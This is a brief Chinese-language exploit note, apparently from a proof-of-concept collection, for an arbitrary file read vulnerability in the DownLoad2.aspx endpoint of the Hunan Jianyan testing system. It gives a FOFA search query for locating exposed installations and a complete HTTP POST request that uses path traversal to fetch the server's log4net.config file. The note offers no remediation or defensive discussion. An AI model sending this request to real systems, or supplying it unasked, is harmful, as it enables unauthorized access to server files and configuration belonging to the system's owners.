## 湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞

湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞，导致系统被攻击与控制。

## fofa

```
body="Login/QRLogin.ashx"
```

## poc

```
POST /Common/DownLoad2.aspx HTTP/1.1
Host: 地址
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
 
path=..%2Flog4net.config&Name=
```

![湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406022022928.png)